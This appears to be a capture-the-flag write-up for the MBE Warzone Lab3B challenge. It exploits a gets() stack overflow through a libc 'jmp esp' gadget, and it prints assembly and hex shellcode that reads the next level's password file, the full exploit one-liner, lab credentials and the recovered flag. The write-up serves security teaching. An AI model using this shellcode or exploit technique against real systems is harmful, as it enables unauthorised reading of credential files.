---
title: "Разбор Lab3B (средне)"
permalink: /writeups/mbe/lab3b/
excerpt: "Разбор Lab3B."
---

---
First, log into the Lab03 as **Lab3B** (`lab3B:th3r3_iz_n0_4dm1ns_0n1y_U!`) and go to the challenges folder:

```shell
$ ssh lab3B@<VM_IP>
$ cd /levels/lab03/
```

Let's execute the program:

```shell
lab3B@warzone:/levels/lab03$ ./lab3B
just give me some shellcode, k
TEST
child is exiting...
```

Here, the program just asks for a shellcode.

## Анализ исходного кода

Let's check the code to see if we can find a bug.

```c
ENABLE_TIMEOUT(60)

int main()
{
    pid_t child = fork();
    char buffer[128] = {0};
    int syscall = 0;
    int status = 0;

    if(child == 0)
    {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);

        puts("just give me some shellcode, k");
        gets(buffer);
    }
    else
    {
        while(1)
        {
            wait(&status);
            if (WIFEXITED(status) || WIFSIGNALED(status)){
                puts("child is exiting...");
                break;
            }

            syscall = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL);

            /* filter out syscall 11, exec */
            if(syscall == 11)
            {
                printf("no exec() for you\n");
                kill(child, SIGKILL);
                break;
            }
        }
    }

    return EXIT_SUCCESS;
}
```

Not much to say here, we have a 128 bytes buffer and we can't use the *execve()* (syscall 11) to call a **/bin/bash**. As the *gets()* function doesn't check the size of the input buffer, we can easily overflow the stack.

## Динамический анализ

First things first, let's find the offset of the return address in `gdb`.

```nasm
lab3B@warzone:/levels/lab03$ gdb lab3B
Reading symbols from lab3B...(no debugging symbols found)...done.
gdb-peda$ pattern create 300
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%'
gdb-peda$ run
Starting program: /levels/lab03/lab3B 
[New process 3108]
just give me some shellcode, k
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAnAASAAoAATAApAAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.19.so...done.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3108]
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x6e414152 ('RAAn')
ECX: 0xfbad2288 
EDX: 0xb7fce8a4 --> 0x0 
ESI: 0x0 
EDI: 0x41534141 ('AASA')
EBP: 0x41416f41 ('AoAA')
ESP: 0xbffff700 ("AAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%")
EIP: 0x70414154 ('TAAp')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x70414154
[------------------------------------stack-------------------------------------]
0000| 0xbffff700 ("AAUAAqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%")
0004| 0xbffff704 ("AqAAVAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%")
0008| 0xbffff708 ("VAArAAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%")
0012| 0xbffff70c ("AAWAAsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%")
0016| 0xbffff710 ("AsAAXAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%")
0020| 0xbffff714 ("XAAtAAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%")
0024| 0xbffff718 ("AAYAAuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%")
0028| 0xbffff71c ("AuAAZAAvAAwAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x70414154 in ?? ()
gdb-peda$ pattern search 
Registers contain pattern buffer:
EIP+0 found at offset: 156
EBX+0 found at offset: 144
EDI+0 found at offset: 148
EBP+0 found at offset: 152
Registers point to pattern buffer:
[ESP] --> offset 160 - size ~140

...[snip]...
```

It seems that we have to write **156** bytes before overwriting the return address. Let's try that!

```nasm
gdb-peda$ r < <(python -c 'print 156 * "\x41" + "\x42\x42\x42\x42" + 150 * "\x43"')
Starting program: /levels/lab03/lab3B < <(python -c 'print 156 * "\x41" + "\x42\x42\x42\x42" + 150 * "\x43"')
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.
[New process 3113]
just give me some shellcode, k
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/libc-2.19.so...done.
Reading symbols from /usr/lib/debug/lib/i386-linux-gnu/ld-2.19.so...done.

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 3113]
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0xfbad2088 
EDX: 0xb7fce8a4 --> 0x0 
ESI: 0x0 
EDI: 0x41414141 ('AAAA')
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff700 ('C' <repeats 150 times>)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff700 ('C' <repeats 150 times>)
0004| 0xbffff704 ('C' <repeats 146 times>)
0008| 0xbffff708 ('C' <repeats 142 times>)
0012| 0xbffff70c ('C' <repeats 138 times>)
0016| 0xbffff710 ('C' <repeats 134 times>)
0020| 0xbffff714 ('C' <repeats 130 times>)
0024| 0xbffff718 ('C' <repeats 126 times>)
0028| 0xbffff71c ('C' <repeats 122 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
```

Now, we have the control of the return address, we also can put lots of data after the return address. Here, we could add our shellcode right after the return address and overwrite the return address with a pointer to the instruction `jmp esp`.

By doing it that way, we will avoid using a massive amount of NOP instructions and we won't have to try multiple return address once outside `gdb`. Indeed, don't forget that the stack addresses will be different outside `gdb`, if we hardcode a stack address as return address, the exploit could fail.

However, do we have `jmp esp` somewhere in the executable. `gdb` with PEDA allows use to use a function called `jmpcall` that search for JMP/CALL instructions in memory.

```nasm
gdb-peda$ jmpcall
0x8048866 : call eax
0x80488a3 : call edx
0x80488ef : call eax
0x8048c5f : jmp [edx]
0x8048c9f : call [ecx]
0x8049866 : call eax
0x80498a3 : call edx
0x80498ef : call eax
0x8049c5f : jmp [edx]
0x8049c9f : call [ecx]
```

No luck... but let's check how `jmpcall` works:

```nasm
gdb-peda$ help jmpcall
Search for JMP/CALL instructions in memory
Usage:
    jmpcall (search all JMP/CALL in current binary)
    jmpcall reg [mapname]
    jmpcall reg start end
```

Ah! It only scanned the binary! Given *libc* is likely to be loaded in our process, let's find its address ranges and try again.

```nasm
gdb-peda$ info file
Symbols from "/levels/lab03/lab3B".
Native process:
    Using the running image of child process 2062.
    While running this, GDB does not access memory from...
Local exec file:
    `/levels/lab03/lab3B', file type elf32-i386.
    Entry point: 0x8048800
    0x08048134 - 0x08048147 is .interp

...[snip]...

    0xb7e3a420 - 0xb7f6bb6e is .text in /lib/i386-linux-gnu/libc.so.6

...[snip]...

gdb-peda$ jmpcall esp 0xb7e3a420 0xb7f6bb6e
0xb7f0b1cd : jmp esp
```

Awesome! We have the right instruction at `0xb7f0b1cd`, where the *.text* section of **libc** is loaded. Now, we can write our shellcode.

## Shellcoding

Here, one of the solution would be to write a shellcode that read the file containing the password and display it on the screen. Here is what I've done, with some comments :)

```nasm
global _start
_start:

; int open(const char *pathname, int flags);
; EBX = *pathname
; ECX = flags
 xor ecx, ecx ; flags = read only
 push ecx ; null byte to end the path string
 ; push "/home/lab3B/.pass" in reverse order
 push "pass"
 push "3A/."
 push "/lab"
 push "home"
 push "////"
 mov ebx, esp ; move the string pointer in EBX
 xor eax, eax
 mov al, 5 ; sys_open()
 int 0x80
 mov edi, eax ; save the file handler

; We read the file
; read(int fd, void *buf, size_t count);
; EBX = fd
; ECX = *buf
; EDX = count
xor edx, edx
mov dl, 0x32 ; read 50 Bytes to the stack (just a guess)
mov ecx, esp
mov ebx, edi ; move fd in ebx
mov al, 3 ; sys_read()
int 0x80

; We write the data in stdout
; write(int fd, const void *buf, size_t count);
; EBX = fd
; ECX = *buf
; EDX = count
mov bl, 1 ; stdout
mov al, 4 ; sys_write()
int 0x80
```

**Заметка** The *Warzone* VM doesn't have **NASM** installed, so I did the development on another Linux 32bit VM.
{: .notice--info}

You can now create a file and assemble it.

```shell
nano read_shellcode.asm
nasm -f elf read_shellcode.asm
ld -o read_shellcode read_shellcode.o
````

Then, we can check the code and generate a shellcode.

```shell
$ objdump -M intel -d read_shellcode

read_shellcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:   31 c9                   xor    ecx,ecx
 8048062:   51                      push   ecx
 8048063:   68 70 61 73 73          push   0x73736170
 8048068:   68 33 41 2f 2e          push   0x2e2f4133
 804806d:   68 2f 6c 61 62          push   0x62616c2f
 8048072:   68 68 6f 6d 65          push   0x656d6f68
 8048077:   68 2f 2f 2f 2f          push   0x2f2f2f2f
 804807c:   89 e3                   mov    ebx,esp
 804807e:   31 c0                   xor    eax,eax
 8048080:   b0 05                   mov    al,0x5
 8048082:   cd 80                   int    0x80
 8048084:   89 c7                   mov    edi,eax
 8048086:   31 d2                   xor    edx,edx
 8048088:   b2 32                   mov    dl,0x32
 804808a:   89 e1                   mov    ecx,esp
 804808c:   89 fb                   mov    ebx,edi
 804808e:   b0 03                   mov    al,0x3
 8048090:   cd 80                   int    0x80
 8048092:   b3 01                   mov    bl,0x1
 8048094:   b0 04                   mov    al,0x4
 8048096:   cd 80                   int    0x80

# Quick trick to extract the shellcode from the binary
$ for i in $(objdump -d read_shellcode -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo

\x31\xc9\x51\x68\x70\x61\x73\x73\x68\x33\x41\x2f\x2e\x68\x2f\x6c\x61\x62\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x89\xc7\x31\xd2\xb2\x32\x89\xe1\x89\xfb\xb0\x03\xcd\x80\xb3\x01\xb0\x04\xcd\x80
```

We have our shellcode, now we can solve the challenge!

## Решение

Here, as we saw earlier, we will use the `jmp esp` address we found in **libc** as return address:

```shell
lab3B@warzone:/levels/lab03$ python -c 'exploit = 156 * "\x90" + "\xcd\xb1\xf0\xb7" + "\x31\xc9\x51\x68\x70\x61\x73\x73\x68\x33\x41\x2f\x2e\x68\x2f\x6c\x61\x62\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x89\xe3\x31\xc0\xb0\x05\xcd\x80\x89\xc7\x31\xd2\xb2\x32\x89\xe1\x89\xfb\xb0\x03\xcd\x80\xb3\x01\xb0\x04\xcd\x80" ; print exploit + "\n"' | ./lab3B
just give me some shellcode, k
wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
````

Good job! You can go to the next [challenge](/writeups/mbe/lab3a/)!
